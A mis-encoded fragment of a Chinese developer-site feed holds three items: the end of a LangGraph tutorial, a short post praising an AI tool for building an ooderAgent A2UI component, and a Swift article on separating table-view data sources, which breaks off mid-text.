<li>æ‹¿åˆ°æœ€å°å¯è·‘é€šçš„ç¤ºä¾‹ï¼Œå¹¶äº†è§£å¦‚ä½•ç”Ÿæˆå¯è§†åŒ–å›¾ï¼ˆç¼ºå›¾å½¢ç¯å¢ƒå¯è·³è¿‡ï¼‰ã€‚</li>
</ul>
<p>ä¸‹ä¸€è®²ï¼ˆMemory ä¸“é¢˜ï¼‰å°†é‡ç‚¹è®²ï¼š</p>
<ul>
<li>LangGraph çš„å†…å­˜æœºåˆ¶ï¼šçŸ­æœŸè®°å¿†ï¼ˆçº¿ç¨‹å†…ï¼‰ä¸é•¿æœŸè®°å¿†ï¼ˆè·¨çº¿ç¨‹/è·¨ä¼šè¯ï¼‰ã€‚</li>
<li>ç”¨ä»£ç å®ç°çŸ­æœŸè®°å¿†ã€é•¿æœŸè®°å¿†ï¼Œæ¼”ç¤ºå¤šçº¿ç¨‹éš”ç¦»ä¸è·¨ä¼šè¯å¤ç”¨ã€‚</li>
<li>å¸¸è§å­˜å‚¨é€‰é¡¹å¯¹æ¯”ä¸ç¤ºä¾‹ï¼šå†…å­˜ï¼ˆMemorySaver / InMemoryStoreï¼‰ã€SQLiteã€MySQLã€Redis ç­‰ã€‚</li>
</ul>
<p>è¯·å‡†å¤‡ï¼šä¸€ä¸ªå¯ç”¨çš„æ•°æ®åº“ç¯å¢ƒï¼ˆSQLite é»˜è®¤å³å¯ï¼Œæˆ–æœ¬åœ° MySQL/Redis å®ä¾‹ï¼‰ä¸è¿æ¥é…ç½®ï¼Œæ–¹ä¾¿ç›´æ¥å®è·µä¸‹ä¸€è®²ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ooderAgent -A2UIå°é²œä¸Šçº¿]]></title>    <link>https://juejin.cn/post/7597739723806162986</link>    <guid>https://juejin.cn/post/7597739723806162986</guid>    <pubDate>2026-01-22T05:52:15.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597739723806162986" data-draft-id="7597757676425953299" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ooderAgent -A2UIå°é²œä¸Šçº¿"/> <meta itemprop="keywords" content="å‰ç«¯æ¡†æ¶"/> <meta itemprop="datePublished" content="2026-01-22T05:52:15.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="OneCodeCN"/> <meta itemprop="url" content="https://juejin.cn/user/1427583415622366"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ooderAgent -A2UIå°é²œä¸Šçº¿
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1427583415622366/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    OneCodeCN
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-22T05:52:15.000Z" title="Thu Jan 22 2026 05:52:15 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-22
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ooderAgent Â skills-a2uiä¸€ç›´éƒ½æ˜¯ï¼ŒooderAI é‡è¦ç»„æˆã€‚éšç€ooderAgent -SDK çš„å®Œå–„ï¼Œooder Skills ä¸Šçº¿çš„é€Ÿåº¦ä¹Ÿåœ¨åŠ é€Ÿã€‚ä»Šå¤©ä¸Šåˆ10ç‚¹ä¸­åˆšå®Œæˆï¼ŒSDKé›†æˆæµ‹è¯•ã€‚ä¸­åˆï¼ŒooderUI å‰ç«¯å›¢é˜Ÿå°±å…¬å¸ƒäº†ï¼Œooder-skills-a2ui ç»„ä»¶ã€‚
åœ¨trae solo çš„ååŠ©ä¸‹ï¼š</p>
<p><strong><em>â€œè¯·å¸®æˆ‘å°† ooderUI ç»„ä»¶åˆ›å»ºä¸ºskillså·¥ç¨‹â€</em> git åœ°å€ä¸ºï¼š</strong></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgitee.com%2FooderCN%2Foodui-es6.git" target="_blank" title="https://gitee.com/ooderCN/oodui-es6.git" ref="nofollow noopener noreferrer">gitee.com/ooderCN/oodâ€¦</a></p>
<p>5åˆ†é’Ÿå,solo è‡ªä¸»å®Œæˆäº†ï¼Œ a2ui çš„é›†æˆã€‚çœŸå¿ƒä¸ºsoloç‚¹èµï¼</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5d064b420a7b43f0b47c26d6a5acd8ee~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT25lQ29kZUNO:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769665935&amp;x-signature=m3yoApTl%2B29M2%2FN29BExpbxzj48%3D" alt="å›¾ç‰‡" loading="lazy"/>
å¥½äº†æˆ‘ä»¬æµ‹è¯•ä¸€ä¸‹ï¼Œ
<strong>A2UI:â€œä¸ºæˆ‘å°†ç°åœ¨çš„å…³ç³»æ¶æ„å›¾è¾“å‡ºä¸€ä¸‹å§â€ï¼š</strong>
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d3bd5f19fa364c69bb72e4930485475b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT25lQ29kZUNO:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769665935&amp;x-signature=%2BCSHCpdo84XK6wry0W%2BaWitvhc8%3D" alt="å›¾ç‰‡" loading="lazy"/>æ²¡æƒ³åˆ°ï¼Œsolo ç«Ÿç„¶è´´å¿ƒçš„å°†ï¼Œvfs èŠ‚ç‚¹ä¸ a2uiè¿›è¡Œäº†è‡ªç»„å…³è”ã€‚è¿™å¯¹äºå‰ç«¯å°ä¼™ä¼´æ¥è¯´çœŸæ˜¯ä¸€ä¸ªå¤§ç¦éŸ³å•Šï¼<br/>
çœŸå¿ƒç¥ç¦ï¼ŒooderAgent è¶Šæ¥è¶Šå¥½ï¼</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å…³äºtableviewåˆ†ç¦»æ•°æ®æºçš„ä¸€ç§æ€è·¯å’Œå®ç°]]></title>    <link>https://juejin.cn/post/7597348590709129256</link>    <guid>https://juejin.cn/post/7597348590709129256</guid>    <pubDate>2026-01-21T02:29:14.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597348590709129256" data-draft-id="7597326073672695823" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å…³äºtableviewåˆ†ç¦»æ•°æ®æºçš„ä¸€ç§æ€è·¯å’Œå®ç°"/> <meta itemprop="keywords" content="Swift"/> <meta itemprop="datePublished" content="2026-01-21T02:29:14.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç”µæ¬¡0510"/> <meta itemprop="url" content="https://juejin.cn/user/2109328584350484"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å…³äºtableviewåˆ†ç¦»æ•°æ®æºçš„ä¸€ç§æ€è·¯å’Œå®ç°
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2109328584350484/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç”µæ¬¡0510
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-21T02:29:14.000Z" title="Wed Jan 21 2026 02:29:14 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    14
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨å¼€å‘ä»»åŠ¡ä¸­ï¼Œæˆ‘å¾€å¾€ä¼šéœ€è¦å®ç°å¦‚ä¸‹åŠŸèƒ½ã€‚</p>
<p>éœ€æ±‚å¦‚ä¸‹ï¼š<br/>
1ã€æˆ‘åœ¨ä¸€ä¸ªViewControllerä¸­æ·»åŠ ä¸€ä¸ªtableView,è¿™ä¸ªtableViewèƒ½å®ç°ç®€å•çš„è·¯ç”±è·³è½¬ï¼Œè€Œä¸æ˜¯æ ¹æ®indexå»è·³è½¬<br/>
2ã€æˆ‘è¿˜æœ‰ä¸€ä¸ªUITableViewControllerï¼Œä¹Ÿè¦å®ç°1ä¸­æåˆ°çš„ä¸€è‡´çš„åŠŸèƒ½ã€‚</p>
<p>è¿™ä¸¤ä¸ªéœ€æ±‚ä¸­æåˆ°ï¼ŒViewControllerå’ŒUITableViewControllerå…¶å®æ˜¯ä½œä¸ºçˆ¶ç±»åœ¨åç»­ä¸­ä½¿ç”¨çš„ã€‚<br/>
å…¶å®åªç”¨ViewController+tableViewå¯ä»¥å®Œå…¨è§„é¿é—®é¢˜ï¼Œä½†æˆ‘å°±æ˜¯è¦å»å UITableViewControllerçš„ä¸€äº›é»˜è®¤å¥½å¤„ã€‚</p>
<p>é‚£ä¹ˆï¼Œæˆ‘ä»¥å¾€çš„æ€è·¯éƒ½æ˜¯ï¼ŒæŠ½è±¡ä¸€ä¸ªprotocol,ç„¶åæä¾›é»˜è®¤å®ç°ã€‚</p>
<p>èœå•é¡¹ç»“æ„ä½“å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">/// é€šç”¨èœå•é¡¹ç»“æ„ä½“</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">HCMenuItem</span> {
Â  Â  <span class="hljs-keyword">public</span> <span class="hljs-keyword">let</span> title: <span class="hljs-type">String</span>
Â  Â  <span class="hljs-keyword">public</span> <span class="hljs-keyword">let</span> viewControllerType: <span class="hljs-type">UIViewController</span>.<span class="hljs-keyword">Type</span>
Â  Â  <span class="hljs-keyword">public</span> <span class="hljs-keyword">init</span>(<span class="hljs-params">title</span>: <span class="hljs-type">String</span>, <span class="hljs-params">vcType</span>: <span class="hljs-type">UIViewController</span>.<span class="hljs-keyword">Type</span>) {
Â  Â  Â  Â  <span class="hljs-keyword">self</span>.title <span class="hljs-operator">=</span> title
Â  Â  Â  Â  <span class="hljs-keyword">self</span>.viewControllerType <span class="hljs-operator">=</span> vcType
Â  Â  }
}
</code></pre>
<p>protocolçš„å¤§è‡´ä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">/// åè®®ï¼šå£°æ˜å…·å¤‡ã€Œèœå•é¡¹åˆ—è¡¨ã€èƒ½åŠ›çš„è§†å›¾æ§åˆ¶å™¨åº”å®ç°çš„è¡Œä¸º</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">protocol</span> <span class="hljs-title class_">HCMenuTableDisplaying</span> {
Â  Â  <span class="hljs-keyword">var</span> menuItems: [<span class="hljs-type">HCMenuItem</span>] { <span class="hljs-keyword">get</span> <span class="hljs-keyword">set</span> }
Â  Â  <span class="hljs-keyword">var</span> cellIdentifier: <span class="hljs-type">String</span> { <span class="hljs-keyword">get</span> }
}

<span class="hljs-comment">// MARK: - ä¸ºé‚£äº›åŒæ—¶éµå¾ª HCMenuTableDisplaying åè®® å¹¶ä¸” æ˜¯ UIViewControllerï¼ˆæˆ–å…¶å­ç±»ï¼‰çš„ç±»å‹ï¼Œæä¾›é»˜è®¤å®ç°</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">extension</span> <span class="hljs-title class_">HCMenuTableDisplaying</span> <span class="hljs-title class_">where</span> <span class="hljs-title class_">Self</span>: <span class="hljs-title class_">UIViewController</span> {
Â  Â  <span class="hljs-comment">// é»˜è®¤ cell æ ‡è¯†ç¬¦</span>
Â  Â  <span class="hljs-keyword">var</span> cellIdentifier: <span class="hljs-type">String</span> {
Â  Â  Â  Â  <span class="hljs-keyword">return</span> <span class="hljs-string">"HCMenuCell"</span>
Â  Â  }

Â  Â  <span class="hljs-keyword">func</span> <span class="hljs-title function_">hc_registerCellIdentifier</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">tableView</span>: <span class="hljs-type">UITableView</span>) {
Â  Â  Â  Â  tableView.register(<span class="hljs-type">UITableViewCell</span>.<span class="hljs-keyword">self</span>, forCellReuseIdentifier: cellIdentifier)
Â  Â  }
    
Â  Â  <span class="hljs-keyword">func</span> <span class="hljs-title function_">hc_tableView</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">tableView</span>: <span class="hljs-type">UITableView</span>, <span class="hljs-params">numberOfRowsInSection</span> <span class="hljs-params">section</span>: <span class="hljs-type">Int</span>) -&gt; <span class="hljs-type">Int</span> {
Â  Â  Â  Â  <span class="hljs-keyword">return</span> menuItems.count
Â  Â  }

Â  Â  <span class="hljs-keyword">func</span> <span class="hljs-title function_">hc_TableView</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">tableView</span>: <span class="hljs-type">UITableView</span>, <span class="hljs-params">cellForRowAt</span> <span class="hljs-params">indexPath</span>: <span class="hljs-type">IndexPath</span>) -&gt; <span class="hljs-type">UITableViewCell</span> {
Â  Â  Â  Â  <span class="hljs-keyword">let</span> cell <span class="hljs-operator">=</span> tableView.dequeueReusableCell(withIdentifier: cellIdentifier, for: indexPath)
Â  Â  Â  Â  <span class="hljs-keyword">let</span> item <span class="hljs-operator">=</span> menuItems[indexPath.row]
Â  Â  Â  Â  cell.textLabel<span class="hljs-operator">?</span>.text <span class="hljs-operator">=</span> item.title
Â  Â  Â  Â  cell.accessoryType <span class="hljs-operator">=</span> .disclosureIndicator
Â  Â  Â  Â  <span class="hljs-keyword">return</span> cell
Â  Â  }

Â  Â  <span class="hljs-keyword">func</span> <span class="hljs-title function_">hc_TableView</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">tableView</span>: <span class="hljs-type">UITableView</span>, <span class="hljs-params">didSelectRowAt</span> <span class="hljs-params">indexPath</span>: <span class="hljs-type">IndexPath</span>) {
Â  Â  Â  Â  <span class="hljs-keyword">let</span> item <span class="hljs-operator">=</span> menuItems[indexPath.row]
Â  Â  Â  Â  <span class="hljs-keyword">let</span> viewController <span class="hljs-operator">=</span> item.viewControllerType.<span class="hljs-keyword">init</span>()
Â  Â  Â  Â  <span class="hljs-comment">//è¿™å¥è¯å¾ˆæœ‰æ„æ€ï¼Œå› ä¸ºSelfæ˜¯UIViewController,æ‰€ä»¥å¯ä»¥ç”¨åˆ°navigationController</span>
Â  Â  Â  Â  navigationController<span class="hljs-operator">?</span>.pushViewController(viewController, animated: <span class="hljs-literal">true</span>)
Â  Â  Â  Â  tableView.deselectRow(at: indexPath, animated: <span class="hljs-literal">true</span>)
Â  Â  }
}
</code></pre>
<p>å…·ä½“çš„tableViewControlleråœ¨ä½¿ç”¨æ—¶åšå¦‚ä¸‹é…ç½®</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">class</span> <span class="hljs-title class_">HCMenuTableViewController</span>: <span class="hljs-title class_">UITableViewController</span> {
Â  Â  <span class="hljs-keyword">var</span> menuItems: [<span class="hljs-type">HCMenuItem</span>] <span class="hljs-operator">=</span> []
Â  Â  <span class="hljs-keyword">override</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">viewDidLoad</span>() {
Â  Â  Â  Â  hc_registerCellIdentifier(tableView)
Â  Â  }
}

<span class="hljs-keyword">extension</span> <span class="hljs-title class_">HCMenuTableViewController</span>: <span class="hljs-title class_">HCMenuTableDisplaying</span> {
Â  Â  <span class="hljs-keyword">override</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">tableView</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">tableView</span>: <span class="hljs-type">UITableView</span>, <span class="hljs-params">numberOfRowsInSection</span> <span class="hljs-params">section</span>: <span class="hljs-type">Int</span>) -&gt; <span class="hljs-type">Int</span> {
Â  Â  Â  Â  hc_tableView(tableView, numberOfRowsInSection: section)
Â  Â  }

Â  Â  <span class="hljs-keyword">override</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">tableView</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">tableView</span>: <span class="hljs-type">UITableView</span>, <span class="hljs-params">cellForRowAt</span> <span class="hljs-params">indexPath</span>: <span class="hljs-type">IndexPath</span>) -&gt; <span class="hljs-type">UITableViewCell</span> {
Â  Â  Â  Â  <span class="hljs-keyword">let</span> cell <span class="hljs-operator">=</span> hc_TableView(tableView, cellForRowAt: indexPath)
Â  Â  Â  Â  <span class="hljs-keyword">return</span> cell
Â  Â  }

Â  Â  <span class="hljs-keyword">override</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">tableView</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">tableView</span>: <span class="hljs-type">UITableView</span>, <span class="hljs-params">didSelectRowAt</span> <span class="hljs-params">indexPath</span>: <span class="hljs-type">IndexPath</span>) {
Â  Â  Â  Â  hc_TableView(tableView, didSelectRowAt: indexPath)
Â  Â  }
}
</code></pre>
<p>è¿™æ˜¯ä¸€ç§å¸¸è§„æ€è·¯ã€‚</p>
<p>ä¸‹é¢æä¾›ä¸€ç§æ›´ä¼˜é›…çš„ï¼Œâ€œåˆ†ç¦»æ•°æ®æºâ€çš„æ€è·¯ä»¥åŠå®ç°ã€‚<br/>
æ ¸å¿ƒæ€æƒ³æ˜¯ï¼šæŠŠâ€œèœå•æ•°æ®æº/ä»£ç†é€»è¾‘â€æŠ½ç¦»æˆä¸€ä¸ªç‹¬ç«‹å¯¹è±¡ï¼ˆDataSource/Delegate å¯¹è±¡ï¼‰ï¼Œç”± VC æŒæœ‰å¹¶æ¡¥æ¥åˆ° tableView</p>
